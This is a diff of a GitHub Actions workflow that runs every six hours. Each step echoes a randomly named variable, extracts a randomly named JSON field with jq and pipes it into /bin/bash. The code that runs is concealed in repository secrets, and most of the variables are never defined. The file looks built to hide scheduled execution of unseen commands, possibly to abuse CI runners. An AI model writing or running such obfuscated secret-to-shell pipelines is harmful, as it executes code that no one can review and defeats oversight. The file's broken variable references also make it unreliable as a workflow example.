@@ -2,7 +2,7 @@ name: zheyangdezk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 0/6 * * *'
+    - cron: '5 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,16 +10,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: zheyangdezk
         env:
-          g5891: ${{ secrets.g5891 }}
+          olhb87389: ${{ secrets.olhb87389 }}
         run: |
-          echo $g5891 | jq -r .xzeyo3 | /bin/bash
-          echo $uxl5793 | jq -r .dcvrl946 | /bin/bash
-          echo $eoxbe65 | jq -r .aaiq06100 | /bin/bash
-          echo $a906 | jq -r .sqje37 | /bin/bash
-          echo $tv7407 | jq -r .xqjb3 | /bin/bash
-          echo $cezr1 | jq -r .mzj99354 | /bin/bash
-          echo $stepf9 | jq -r .m585 | /bin/bash
-          echo $lohyd4 | jq -r .mwhvs2 | /bin/bash
-          echo $mdc1 | jq -r .irq9 | /bin/bash
-          echo $iyjgw264 | jq -r .nfgl1416 | /bin/bash
+          echo $olhb87389 | jq -r .gyh917 | /bin/bash
+          echo $eozie374 | jq -r .cvov98605 | /bin/bash
+          echo $hvryn645 | jq -r .cfmzx619 | /bin/bash
+          echo $wcob48 | jq -r .xt193 | /bin/bash
+          echo $fq5 | jq -r .h03827 | /bin/bash
+          echo $x68 | jq -r .d4540 | /bin/bash
+          echo $y12885 | jq -r .i6871 | /bin/bash
+          echo $cjwe53 | jq -r .yl5490 | /bin/bash
+          echo $gaux8892 | jq -r .hly0681 | /bin/bash
+          echo $uzis576 | jq -r .l06 | /bin/bash
+          echo $gv2 | jq -r .bdt27 | /bin/bash
+          echo $x684 | jq -r .hfnsx60 | /bin/bash
 
